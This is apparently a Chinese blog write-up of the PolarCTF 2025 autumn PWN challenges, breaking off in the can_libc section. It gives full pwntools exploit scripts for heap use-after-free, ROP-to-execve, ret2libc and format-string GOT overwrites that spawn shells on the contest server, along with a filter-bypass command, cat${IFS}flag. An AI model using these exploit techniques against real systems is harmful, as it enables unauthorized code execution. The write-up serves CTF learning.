---
title: 【WP】PolarCTF2025年秋季个人挑战赛PWN方向全题解
url: https://mp.weixin.qq.com/s/tb8-C6LudI_x5ZJZM1uG7A
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:37:41.872149
---

# 【WP】PolarCTF2025年秋季个人挑战赛PWN方向全题解

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaNABg4SN7icT65TvKAOKmGAibic1tV4oY0VbYDfDa1IjkXk9GU6ZH7jHJw/0?wx_fmt=jpeg)

# 【WP】PolarCTF2025年秋季个人挑战赛PWN方向全题解

原创

F1rstb100d
F1rstb100d

智佳网络安全

![]()

在小说阅读器中沉浸阅读

发现秋季赛当时unlink的题目没做，现在补上一个完整的writeup

uaf

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dha1KM6TppRcQhxXEBQRd6xNCWpO4vicL2CBicGKPPcx2S2s4mo2OF7qqnw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaDAvccjR9tgice5pPWniaZcSNdDa2mPuSq21ibRmkQibDb4ZqssJZiaHghbg/640?wx_fmt=png&from=appmsg)

存在uaf和堆溢出漏洞

直接打malloc\_hook为one\_gadget就行，注意需要realloc\_hook调栈

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaheDuiacwPWRVsrnmRHphyK1Vxc8B7RtFrhfgK9AORJjJ00Veb01ZcUw/640?wx_fmt=png&from=appmsg)

```
from pwn import *
from LibcSearcher import *
from struct import pack
from ctypes import *

context(log_level = 'debug', arch = 'amd64', os = 'linux')
p = remote('1.95.36.136', 2101)
#p=process('./pwn1')
#p = process(['./ld-2.31.so','./pwn'], env = {'LD_PRELOAD' : './libc-2.31.so'})
#p=gdb.debug('./pwn','b main')
elf = ELF('./pwn1')
libc=ELF('./libc.so.6')

def debug():
    gdb.attach(p)
    pause()

def create(idx,size):
    p.sendlineafter(b"choice:\n", b"1")
    p.sendlineafter(b"index:\n", str(idx))
    p.sendlineafter(b"size:\n", str(size))
    #p.sendafter(b"Content :\n", content)

def show(idx):
    p.sendlineafter(b"choice:\n", b"4")
    p.sendlineafter(b'index:\n',str(idx))

def free(idx):
    p.sendlineafter(b"choice:\n", b"2")
    p.sendlineafter(b'index:\n',str(idx))

def edit(idx, size, content):
    p.sendlineafter(b"choice:\n", b"3")
    p.sendlineafter(b"index:\n", str(idx))
    p.sendlineafter(b"length:\n", str(size))
    p.sendafter(b"content:\n", content)

create(0,0x68)#0
create(1,0x80)#1
create(2,0x68)#1

free(1) #unsortedbin
show(1)

main_arena_add88_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
main_arena_addr = main_arena_add88_addr - 88
malloc_hook_addr = main_arena_addr - 0x10
print(hex(malloc_hook_addr))
libc_base = malloc_hook_addr - libc.symbols['__malloc_hook']
print(hex(libc_base))
realloc = libc_base + libc.sym['realloc']
#one_gadget = libc_base + 0x45226
one_gadget = libc_base + 0x4527a
#one_gadget = libc_base + 0xf03a4
#one_gadget = libc_base + 0xf1247

free(0)

edit(0,0x68,p64(malloc_hook_addr-0x23))

create(3,0x68)
create(4,0x68)

edit(4,0x68,b'a'*(0x13-0x8)+p64(one_gadget) + p64(realloc + 8))

create(5,0x10)

p.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaiaBp8MSkTn49CrKtrcxghThXnqDR5sibIcDTTicpUzuG4l10HHrMRlfhA/640?wx_fmt=png&from=appmsg)

得到flag{8ae1c88b-eb9f-487a-bf34-831a2b40be87}

call64

一个64位静态编译的ELF，进去就是一个栈溢出

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaYzgR5y3TolbCD00XcPooGDiao5jYpxicgT0PvKntqoiboKe8jsiblaNnicA/640?wx_fmt=png&from=appmsg)

但是没有/bin/sh字符串

所以需要先构造一个rop写/bin/sh

read(0, buf, 8) 往bss或者data段上buf位置写入/bin/sh

字符串然后构造execve('/bin/sh', 0, 0)即可getshell

注意payload需要senline一次全部送过去，以及有一个坑ROPgadget直接--only没有找到syscall;ret;的地址，加上—all参数才可以

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaRN0koQZiahKQZgHEjUyIj2FqWh7iaicZmw7BcicQyWRibV57vibuEgqvJnibw/640?wx_fmt=png&from=appmsg)

```
from pwn import *
from LibcSearcher import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
p = remote('1.95.36.136', 2146)
#p=process('./pwn2')
#p=gdb.debug('./pwn2','b main')
elf = ELF('./pwn2')
#libc=ELF('./libc6-i386_2.23-0ubuntu11.3_amd64.so')

def debug():
    gdb.attach(p)
    pause()

buf = 0x6CA090
syscall_ret = 0x4677D5
pop_rax_ret = 0x41f804
pop_rdi_ret = 0x401636
pop_rdx_ret = 0x442cb6
pop_rsi_ret = 0x401757

#read(0, buf, 8)
payload = b'a'*(0x30+0x8)+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(buf)+p64(pop_rdx_ret)+p64(0x8)+p64(pop_rax_ret)+p64(0)+p64(syscall_ret)

#execve('/bin/sh', 0, 0)
payload += p64(pop_rdi_ret)+p64(buf)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0)+p64(pop_rax_ret)+p64(0x3b)+p64(syscall_ret)

p.sendline(payload)
p.send(b'/bin/sh\x00')

p.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaYibwen06elNOz6q1WKn0qj7SzHwZjNqZsAjoK0VrRH4yK9htsnG5Skg/640?wx_fmt=png&from=appmsg)

flag{861d1dad-2229-433f-9ad4-e5d921b80552}

shellcode

32位栈溢出能直接做，不用shellcode

libc选择libc6-i386\_2.23-0ubuntu11.3\_amd64

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhadAXwrHpcaJoED6WWuviayBIqKma9riaLGCgnAFicqp4CbqnlltG2ib4JzA/640?wx_fmt=png&from=appmsg)

```
from pwn import *
from LibcSearcher import *
context(log_level = 'debug', arch = 'i386', os = 'linux')
p = remote('1.95.36.136', 2092)
#p=process('./pwn1')
#p=gdb.debug('./pwn1','b input')
elf = ELF('./pwn1')
#libc=ELF('./libc.so.6')

def debug():
    gdb.attach(p)
    pause()

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

p.sendlineafter(b'hello hacker',b'')
payload = b'a'*(0x48+0x4)+p32(puts_plt)+p32(main_addr)+p32(puts_got)
p.sendlineafter(b'say hello:\n',payload)
puts_addr = u32(p.recv(4))
print(hex(puts_addr))

libc=LibcSearcher("puts",puts_addr)
libcbase=puts_addr-libc.dump("puts")
addr_system=libcbase+libc.dump("system")
addr_binsh=libcbase+libc.dump("str_bin_sh")

p.sendlineafter(b'hello hacker',b'')
payload = b'a'*(0x48+0x4)+p32(addr_system)+p32(main_addr)+p32(addr_binsh)
p.sendlineafter(b'say hello:\n',payload)

p.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaAxmcP9cL0czth8OSiaxoIPeYibc9mem5GRFELuDHErvA1jAUOo6YeuEA/640?wx_fmt=png&from=appmsg)

flag{dfdbc6ca-f417-4727-80fa-f64b9dffcc9d}

nc

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaXBPZrghA2YuIzO12Bx8tv0kM9tcvjRS1vI04WS9454PPLPnvicYwuyg/640?wx_fmt=png&from=appmsg)

需要输入$0进入special mode

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaDkd9Wz027IG642uCmUVpCmlM6xN601mZ3CZ3ic8gCwTnnst30xZYL7w/640?wx_fmt=png&from=appmsg)

然后命令过滤函数需要输入cat${IFS}flag

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhab6j2NpKTVoZq4QMauPkdWlVWhbbpzNn5ibPiczAaNkK09U6RHklVM1wQ/640?wx_fmt=png&from=appmsg)

得到flag{b1d269b6-bd02-4c1d-a313-48b68d9422a7}

fmt

一个循环的格式化字符串漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaa3Lwn5hGX1wEqTSicdSZjxxdVeOo39gfX5Z5hxFckTtKWQiayVUSic0eQ/640?wx_fmt=png&from=appmsg)

32位ubuntu 16.04 libc2.23，泄露栈上一个libc地址然后计算system@libc的地址，然后把printf\_got内的值printf@libc改成system@libc，最后输入/bin/sh即可

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhaGGXnRmQjqZv3ibUaHBdQWzTU3lK2hh8FOo1ic88ibbXicdPef5noXttqCw/640?wx_fmt=png&from=appmsg)

```
from pwn import *
from LibcSearcher import *
context(log_level = 'debug', arch = 'i386', os = 'linux')
p = remote('1.95.36.136', 2110)
#p=process('./pwn1')
#p=gdb.debug('./pwn1','b input')
elf = ELF('./pwn1')
libc=ELF('./libc6-i386_2.23-0ubuntu11.3_amd64.so')

def debug():
    gdb.attach(p)
    pause()

p.sendlineafter(b'Do you like PolarCTF?\n', b'yes')
p.sendlineafter(b'flag here!\n\n', b'%75$p')
p.recvuntil(b'0x')
libc_addr = int(p.recv(8),16)
libc_base = libc_addr - 0x18647
print(hex(libc_base))

system_addr = libc_base + libc.symbols['system']
printf_got = elf.got['printf'] #0x804A014

payload=fmtstr_payload(8,{printf_got:system_addr})
p.sendline(payload)

p.sendline(b'/bin/sh')

p.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhahJK0HIQJxsuMTIPbu789TA5b59e70X8ibQNJjrcZicbIZ4LvWz1ib9LHA/640?wx_fmt=png&from=appmsg)

flag{688558ec-5344-4619-92de-498ba018282a}

can\_libc

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dhamxMyayIBW1iamxxOKJZEicp4srN3yicZFJib8oCYSqsvfmYrbQgJv2yBfw/640?wx_fmt=png&from=appmsg)

格式化字符串泄露canary

跳转回main重新执行并泄露puts\_got的内容

选择libc6-i386\_2.23-0ubuntu11.3\_amd64

就是传统的ret2libc板子了

![](https://mmbiz.qpic.cn/mmbiz_png/FslaC6a9w4NiaibUfPzP8LUJm4SicR63dha6lpgUo5zN2NiaXKZqVen3Sn4dZl0gQPbLjfzibkZbhaYXSPlpwrWtSicA/640?wx...